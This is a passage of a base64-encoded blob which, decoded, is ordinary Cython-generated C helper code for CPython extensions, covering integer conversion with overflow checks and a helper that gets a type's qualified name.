AgICBpZiAodW5saWtlbHkocmV0KSkKICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICByZXR1cm4gdmFsOwogICAgfQpyYWlzZV9vdmVyZmxvdzoKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLAogICAgICAgICJ2YWx1ZSB0b28gbGFyZ2UgdG8gY29udmVydCB0byBsb25nIik7CiAgICByZXR1cm4gKGxvbmcpIC0xOwpyYWlzZV9uZWdfb3ZlcmZsb3c6CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwKICAgICAgICAiY2FuJ3QgY29udmVydCBuZWdhdGl2ZSB2YWx1ZSB0byBsb25nIik7CiAgICByZXR1cm4gKGxvbmcpIC0xOwp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAKc3RhdGljIF9fUHl4X1R5cGVOYW1lCl9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlUeXBlT2JqZWN0KiB0cCkKewogICAgUHlPYmplY3QgKm1vZHVsZSA9IE5VTEwsICpuYW1lID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7CiAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwYjAwMDAKICAgIG5hbWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKChQeU9iamVjdCAqKXRwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9xdWFsbmFtZSk7CiAgICAjZWxzZQogICAgbmFtZSA9IFB5VHlwZV9HZXRRdWFsTmFtZSh0cCk7CiAgICAjZW5kaWYKICAgIGlmICh1bmxpa2VseShuYW1lID09IE5VTEwpIHx8IHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2sobmFtZSkpKSBnb3RvIGJhZDsKICAgIG1vZHVsZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoKFB5T2JqZWN0ICopdHAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21vZHVsZSk7CiAgICBpZiAodW5saWtlbHkobW9kdWxlID09IE5VTEwpIHx8IHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2sobW9kdWxlKSkpIGdvdG8gYmFkOwogICAgaWYgKFB5VW5pY29kZV9Db21wYXJlV2l0aEFTQ0lJU3RyaW5nKG1vZHVsZSwgImJ1aWx0aW5zIikgPT0gMCkgewogICAgICAgIHJlc3VsdCA9IG5hbWU7CiAgICAgICAgbmFtZSA9IE5VTEw7CiAgICAgICAgZ290byBkb25lOwogICAgfQogICAgcmVzdWx0ID0gUHlVbmljb2RlX0Zyb21Gb3JtYXQoIiVVLiVVIiwgbW9kdWxlLCBuYW1lKTsKICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gTlVMTCkpIGdvdG8gYmFkOwogIGRvbmU6CiAgICBQeV9YREVDUkVGKG5hbWUpOwogICAgUHlfWERFQ1JFRihtb2R1bGUpOwogICAgcmV0dXJuIHJlc3VsdDsKICBiYWQ6CiAgICBQeUVycl9DbGVhcigpOwogICAgaWYgKG5hbWUpIHsKICAgICAgICByZXN1bHQgPSBuYW1lOwogICAgICAgIG5hbWUgPSBOVUxMOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTcpOwogICAgfQogICAgZ290byBkb25lOwp9CiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUxvbmdfQXNfaW50KFB5T2JqZWN0ICp4KSB7CiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUMKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwdXNoCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIgojZW5kaWYKICAgIGNvbnN0IGludCBuZWdfb25lID0gKGludCkgLTEsIGNvbnN0X3plcm8gPSAoaW50KSAwOwojaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wCiNlbmRpZgogICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87CiAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVjayh4KSkpIHsKICAgICAgICBpbnQgdmFsOwogICAgICAgIFB5T2JqZWN0ICp0bXAgPSBfX1B5eF9QeU51bWJlcl9Mb25nKHgpOwogICAgICAgIGlmICghdG1wKSByZXR1cm4gKGludCkgLTE7CiAgICAgICAgdmFsID0gX19QeXhfUHlMb25nX0FzX2ludCh0bXApOwogICAgICAgIFB5X0RFQ1JFRih0bXApOwogICAgICAgIHJldHVybiB2YWw7CiAgICB9CiAgICBpZiAoaXNfdW5zaWduZWQpIHsKI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNOZWcoeCkpKSB7CiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93OwogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIF9fUHl4X2NvbXBhY3RfdXB5bG9uZywgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZVVuc2lnbmVkKHgpKQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpOwogICAgICAgICAgICBhc3NlcnQoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgPiAxKTsKICAgICAgICAgICAgc3dpdGNoIChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSkgewogICAgICAgICAgICAgICAgY2FzZSAyOgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihpbnQpID4gMSAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgPj0gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihpbnQpID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSA+PSAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSA0OgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihpbnQpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpID49IDQgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgfQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTcKICAgICAgICBpZiAodW5saWtlbHkoUHlfU0laRSh4KSA8IDApKSB7CiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93OwogICAgICAgIH0KI2Vsc2UKICAgICAgICB7CiAgICAgICAgICAgIGludCByZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woeCwgUHlfRmFsc2UsIFB5X0xUKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA8IDApKQogICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xOwogICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0ID09IDEpKQogICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfQojZW5kaWYKICAgICAgICBpZiAoKHNpemVvZihpbnQpIDw9IHNpemVvZih1bnNpZ25lZCBsb25nKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgdW5zaWduZWQgbG9uZywgUHlMb25nX0FzVW5zaWduZWRMb25nKHgpKQojaWZkZWYgSEFWRV9MT05HX0xPTkcKICAgICAgICB9IGVsc2UgaWYgKChzaXplb2YoaW50KSA8PSBzaXplb2YodW5zaWduZWQgUFlfTE9OR19MT05HKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgdW5zaWduZWQgUFlfTE9OR19MT05HLCBQeUxvbmdfQXNVbnNpZ25lZExvbmdMb25nKHgpKQojZW5kaWYKICAgICAgICB9CiAgICB9IGVsc2UgewojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAgICAgaWYgKF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBfX1B5eF9jb21wYWN0X3B5bG9uZywgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSkKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyh4KTsKICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7CiAgICAgICAgICAgIHN3aXRjaCAoX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeCkpIHsKICAgICAgICAgICAgICAgIGNhc2UgLTI6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMSAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgbG9uZywgLShsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKGludCktMSkqKCgoKChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDI6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgLTM6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgbG9uZywgLShsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoaW50KS0xKSooKCgoKCgoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgLTQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgbG9uZywgLShsb25nKSAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKChpbnQpLTEpKigoKCgoKCgoKGludClkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KI2VuZGlmCiAgICAgICAgaWYgKChzaXplb2YoaW50KSA8PSBzaXplb2YobG9uZykpKSB7CiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhpbnQsIGxvbmcsIFB5TG9uZ19Bc0xvbmcoeCkpCiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihpbnQpIDw9IHNpemVvZihQWV9MT05HX0xPTkcpKSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc0xvbmdMb25nKHgpKQojZW5kaWYKICAgICAgICB9CiAgICB9CiAgICB7CiAgICAgICAgaW50IHZhbDsKICAgICAgICBpbnQgcmV0ID0gLTE7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgUHlfc3NpemVfdCBieXRlc19jb3BpZWQgPSBQeUxvbmdfQXNOYXRpdmVCeXRlcygKICAgICAgICAgICAgeCwgJnZhbCwgc2l6ZW9mKHZhbCksIFB5X0FTTkFUSVZFQllURVNfTkFUSVZFX0VORElBTiB8IChpc191bnNpZ25lZCA/IFB5X0FTTkFUSVZFQllURVNfVU5TSUdORURfQlVGRkVSIHwgUHlfQVNOQVRJVkVCWVRFU19SRUpFQ1RfTkVHQVRJVkUgOiAwKSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA9PSAtMSkpIHsKICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA+IChQeV9zc2l6ZV90KSBzaXplb2YodmFsKSkpIHsKICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXQgPSAwOwogICAgICAgIH0KI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwICYmICEoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIHx8IGRlZmluZWQoX1B5TG9uZ19Bc0J5dGVBcnJheSkKICAgICAgICBpbnQgb25lID0gMTsgaW50IGlzX2xpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTsKICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbDsKICAgICAgICByZXQgPSBfUHlMb25nX0FzQnl0ZUFycmF5KChQeUxvbmdPYmplY3QgKil4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlcywgc2l6ZW9mKHZhbCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzX2xpdHRsZSwgIWlzX3Vuc2lnbmVkKTsKI2Vsc2UKICAgICAgICBQeU9iamVjdCAqdjsKICAgICAgICBQeU9iamVjdCAqc3RlcHZhbCA9IE5VTEwsICptYXNrID0gTlVMTCwgKnNoaWZ0ID0gTlVMTDsKICAgICAgICBpbnQgYml0cywgcmVtYWluaW5nX2JpdHMsIGlzX25lZ2F0aXZlID0gMDsKICAgICAgICBpbnQgY2h1bmtfc2l6ZSA9IChzaXplb2YobG9uZykgPCA4KSA/IDMwIDogNjI7CiAgICAgICAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdCh4KSkpIHsKICAgICAgICAgICAgdiA9IF9fUHl4X05ld1JlZih4KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB2ID0gUHlOdW1iZXJfTG9uZyh4KTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2KSkgcmV0dXJuIChpbnQpIC0xOwogICAgICAgICAgICBhc3NlcnQoUHlMb25nX0NoZWNrRXhhY3QodikpOwogICAgICAgIH0KICAgICAgICB7CiAgICAgICAgICAgIGludCByZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2wodiwgUHlfRmFsc2UsIFB5X0xUKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA8IDApKSB7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYodik7CiAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgLTE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaXNfbmVnYXRpdmUgPSByZXN1bHQgPT0gMTsKICAgICAgICB9CiAgICAgICAgaWYgKGlzX3Vuc2lnbmVkICYmIHVubGlrZWx5KGlzX25lZ2F0aXZlKSkgewogICAgICAgICAgICBQeV9ERUNSRUYodik7CiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93OwogICAgICAgIH0gZWxzZSBpZiAoaXNfbmVnYXRpdmUpIHsKICAgICAgICAgICAgc3RlcHZhbCA9IFB5TnVtYmVyX0ludmVydCh2KTsKICAgICAgICAgICAgUHlfREVDUkVGKHYpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXN0ZXB2YWwpKQogICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0ZXB2YWwgPSB2OwogICAgICAgIH0KICAgICAgICB2ID0gTlVMTDsKICAgICAgICB2YWwgPSAoaW50KSAwOwogICAgICAgIG1hc2sgPSBQeUxvbmdfRnJvbUxvbmcoKDFMIDw8IGNodW5rX3NpemUpIC0gMSk7IGlmICh1bmxpa2VseSghbWFzaykpIGdvdG8gZG9uZTsKICAgICAgICBzaGlmdCA9IFB5TG9uZ19Gcm9tTG9uZyhjaHVua19zaXplKTsgaWYgKHVubGlrZWx5KCFzaGlmdCkpIGdvdG8gZG9uZTsKICAgICAgICBmb3IgKGJpdHMgPSAwOyBiaXRzIDwgKGludCkgc2l6ZW9mKGludCkgKiA4IC0gY2h1bmtfc2l6ZTsgYml0cyArPSBjaHVua19zaXplKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICp0bXAsICpkaWdpdDsKICAgICAgICAgICAgbG9uZyBpZGlnaXQ7CiAgICAgICAgICAgIGRpZ2l0ID0gUHlOdW1iZXJfQW5kKHN0ZXB2YWwsIG1hc2spOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIWRpZ2l0KSkgZ290byBkb25lOwogICAgICAgICAgICBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKGRpZ2l0KTsKICAgICAgICAgICAgUHlfREVDUkVGKGRpZ2l0KTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIHZhbCB8